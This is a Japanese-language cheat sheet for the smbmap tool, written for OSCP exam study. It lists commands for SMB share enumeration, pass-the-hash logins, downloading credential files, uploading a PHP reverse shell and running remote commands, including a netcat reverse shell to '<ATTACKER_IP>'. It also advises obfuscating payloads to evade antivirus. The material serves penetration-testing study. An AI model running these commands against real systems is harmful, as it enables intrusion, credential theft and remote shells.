# smbmap

## 🎯 概要
**smbmap** は、SMBプロトコルを介してネットワーク全体、または特定のホストに対して、共有フォルダ、アクセス権限、およびファイル内容を列挙するための強力なPythonベースのツールです。ペネトレーションテストやOSCPにおいて、SMBサービス（TCP 139/445）は侵入の足がかりとなる重要な標的です。smbmapを使用することで、匿名ログインの可否、各共有に対する読み取り・書き込み権限の有無、特定ファイルの検索、さらにはリモートコマンド実行（RCE）の確認までを迅速に行うことができます。

---

## 🛠 代表的な用途
- **共有フォルダの権限列挙**: ターゲット上の全共有名と現在のユーザーの権限（READ/WRITE）を表示。
- **再帰的なディレクトリ探索**: 共有フォルダ内のファイル構造を自動的に深掘りし、機密ファイルを特定。
- **認証情報の検証**: ユーザー名、パスワード、またはNTハッシュを使用して複数のホストに対して一括ログイン試行。
- **リモートコマンド実行**: 適切な権限がある場合、対話型シェルを介さずにOSコマンドを実行。
- **OSCPでの利用ポイント**: 列挙フェーズにおいて、`smbclient` よりも視認性が高く、かつ `-R` オプションによる再帰的なファイルリスト取得が極めて強力なため、隠し設定ファイルやパスワードメモの発見に多用されます。

---

## 🔍 基本コマンド
```bash
# 特定のホストに対して匿名アクセスの権限を確認
smbmap -H 10.10.10.1

# 特定のユーザー名とパスワードを使用して権限を確認
smbmap -u <username> -p <password> -H 10.10.10.1

# ドメイン名を指定して実行
smbmap -u <username> -p <password> -d <domain> -H 10.10.10.1

# 全共有フォルダの内容を再帰的に表示
smbmap -H 10.10.10.1 -R
```

---

## 🧪 よく使う攻撃シナリオ
- **機密情報の探索**: `-R` オプションで全フォルダをスキャンし、`passwords.txt` や `unattend.xml`、`.config` ファイルなどの機密情報を含むファイルを見つけ出します。
- **パス・ザ・ハッシュ (PtH)**: 別のサービスから入手したNTハッシュを使用して、共有フォルダへのアクセスやコマンド実行を試みます。
- **書き込み権限の悪用**: Webサイトの公開ディレクトリがSMB共有されている場合、リバースシェルをアップロードして初期侵入を達成します。

---

## 📌 フェーズ別コマンド例  

### 🔎 Reconnaissance（技術的偵察）
```bash
# Nmapスキャンでポート445が開いているホストを確認
nmap -p 445 --open 10.10.10.0/24

# ネットワーク内の複数ホストに対して匿名アクセスをスイープ
smbmap -H 10.10.10.0/24
```

---

### 🧭 Enumeration（外部サービスの詳細調査）
```bash
# 共有フォルダ「Public」の内容を再帰的にリストアップ
smbmap -H 10.10.10.1 -r Public

# 特定のキーワード（例: "secret"）を含むファイルを全共有から検索
smbmap -H 10.10.10.1 -R | grep -i "secret"

# 共有フォルダ内のファイル名だけでなく、ファイルのサイズ情報等を含めて表示
smbmap -H 10.10.10.1 -v
```

---

### 🔑 Credential Access（認証情報探索）
```bash
# 入手したNTハッシュを使用して認証を試行（パス・ザ・ハッシュ）
smbmap -u Administrator -a 7a38310ea6f0027ee955abed1762964b -H 10.10.10.1

# 認証が成功したホストに対してのみ結果を表示（複数ホスト指定時）
smbmap -u user -p pass -H 10.10.10.0/24 2>/dev/null | grep READ
```

---

### 🚪 Initial Access（初期侵入）
```bash
# 共有「backups」から特定の機密ファイルをローカルにダウンロード
smbmap -H 10.10.10.1 --download "backups\credentials.xml"

# 書き込み可能な共有に対して、リバースシェル用ペイロードをアップロード
smbmap -H 10.10.10.1 --upload "/tmp/shell.php" "www-root\shell.php"
```

---

### 📈 Privilege Escalation（権限昇格）
```bash
# 共有フォルダ内から「sysprep」や「unattend」など、管理者パスワードが含まれやすいファイルを探索
smbmap -H 10.10.10.1 -R | grep -iE "unattend|sysprep|vnc"

# ドメインコントローラのSYSVOL共有からGPOパスワードファイルを探索
smbmap -u <user> -p <pass> -d <domain> -H <DC_IP> -r "SYSVOL" -R
```

---

### 🏢 Active Directory（AD）
基本的に関連なし。ただし、ドメイン環境において各ホストへのアクセス権を一括確認する際に非常に有効です。

---

### 🚪 Pivot / Port Forward（内部サービスへのアクセス）
```bash
# Proxychainsを経由して内部ネットワークのSMB権限を調査
proxychains smbmap -H 172.16.50.217 -u <user> -p <pass>
```

---

### 🚀 Lateral Movement（横展開）
```bash
# 管理者権限がある場合、指定したOSコマンドを実行（例: whoami）
smbmap -u Administrator -p 'Password123!' -H 10.10.10.1 -x "whoami"

# 攻撃者のIPに向けてリバースシェルを実行（リモート実行が可能か確認）
smbmap -u Administrator -p 'Password123!' -H 10.10.10.1 -x "nc -e cmd.exe <ATTACKER_IP> 4444"
```

---

## 🧰 便利オプション一覧
- `-H <host>`：ターゲットIPまたはホスト名を指定。
- `-u <user>`：ユーザー名を指定。
- `-p <pass>`：パスワードを指定。
- `-a <hash>`：NTハッシュを指定（PtH攻撃用）。
- `-d <domain>`：ドメイン名を指定。
- `-R`：全ての共有フォルダ内を再帰的に列挙。
- `-r <folder>`：特定の共有フォルダ内を再帰的に列挙。
- `-x <cmd>`：リモートでOSコマンドを実行。
- `--download <path>`：ファイルをダウンロード。
- `--upload <src> <dst>`：ファイルをアップロード。
- `-L`：利用可能な全プロトコル（SMB1, SMB2等）で接続を試行。

---

## 🚀 実践例

```bash
# 【1】OSCP初期調査：匿名ログインが可能な全ファイルを一気に洗い出す
smbmap -H $IP -R

# 【2】判明した資格情報を用いて、ネットワーク全体で「読み書き可能」なホストを特定
smbmap -u 'john' -p 'dqsTwTpZPn#nL' -H 10.10.10.0/24 | grep "WRITE"

# 【3】管理者権限の確認とコマンド実行のクイックテスト
smbmap -u Administrator -p 'Welcome123!' -H 192.168.50.212 -x "ipconfig /all"

# 【4】共有フォルダから設定ファイルを自動で手元に取得
smbmap -H 192.168.50.15 -u guest -p "" --download "web\web.config"

# 【5】大量のホストをリストから読み込み、特定のユーザーのアクセス権を確認
smbmap -H targets.txt -u common_user -p common_pass
```

---

## 🧩 他ツールとの組み合わせ
- **nmap** → `nmap --script smb-enum-shares` の結果を視覚的に補完するために smbmap を使用します。
- **CrackMapExec / NetExec** → CrackMapExecで「Pwned!」と表示されたホストに対し、smbmap でより詳細なディレクトリ探索やファイル取得を行います。
- **impacket-psexec** → smbmap の `-x` コマンドが動作することを確認した後、`psexec.py` で永続的なシェルを取得します。
- **grep** → 再帰スキャン結果から `password`, `login`, `key`, `conf` などのキーワードを抽出します。

---

## 📝 注意点（OSCP 試験での使い方）
- **バイナリ転送の制限**: smbmap自体は攻撃端末側で動くため問題ありませんが、アップロード機能を使ってリバースシェルを配置する場合、アンチウイルス（AV）に検知されないようペイロードの難読化が必要です。
- **誤検知**: `-H` でネットワーク範囲を指定した際、稀に応答が遅いホストで権限なしと判定されることがあります。怪しい場合は単一IP指定で再試行してください。
- **出力の保存**: 再帰スキャン（`-R`）の結果は膨大になることがあります。必ず `tee` コマンド等でファイルにログを残してください。

---

## 🔗 参考リンク
- 公式：[smbmap GitHub Repository](https://github.com/ShawnDEvans/smbmap)
- 解説：[SMB Enumeration (HackTricks)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
